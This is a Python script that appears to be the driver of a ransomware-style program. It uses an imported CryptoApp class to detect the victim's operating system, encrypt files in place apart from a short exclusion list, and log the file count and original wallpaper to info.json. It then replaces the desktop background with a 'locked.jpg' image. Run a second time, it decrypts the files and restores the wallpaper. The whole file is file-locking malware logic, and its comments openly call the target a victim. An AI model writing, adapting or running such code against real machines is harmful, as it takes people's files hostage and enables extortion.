from cryptography.fernet import Fernet
from CryptoApp import CryptoApp
import os
import json


JSON_PATH = 'info.json'

# Init the APP, do not encrypt these files specified in a constructor
APP = CryptoApp([
    JSON_PATH,
    '__pycache__',
    'not',
    'locked.jpg'
])


# Init the variables
# Victim's OS, and empty wallpaper variable
OS = APP.determineOS()
new_wallpaper = None


if APP.isAlreadyEncrypted():
    APP.decrypt()

    # If decrypted successfully, handle the JSON file
    if os.path.isfile(JSON_PATH):

        # Parse the JSON file
        json_file = APP.readFile(JSON_PATH)
        to_dict = json.loads(json_file)

        if 'original_background' in to_dict:
            # Set the wallpaper variable
            new_wallpaper = to_dict["original_background"]

        # Remove the JSON file
        os.remove(JSON_PATH)

else:
    # Get the number of total modified files
    files_num = APP.encrypt()

    # Save some informations to a JSON file
    asJSON = OS
    asJSON["status"] = 'encrypted'
    asJSON["files_modified"] = files_num

    # Get the current wallpaper
    currentBG = APP.getDesktopBG(OS["os"], OS["de"])
    if currentBG:
        # And save it
        asJSON["original_background"] = currentBG
    
    # Locked screen wallpaper
    if os.path.isfile('locked.jpg'):
        new_wallpaper = 'locked.jpg'

    # Create and save the JSON
    j = json.dumps(asJSON, indent=4)
    APP.writeFile(JSON_PATH, j)



# Change the victim's wallpaper
APP.setDesktopBG(OS["os"], OS["de"], new_wallpaper)



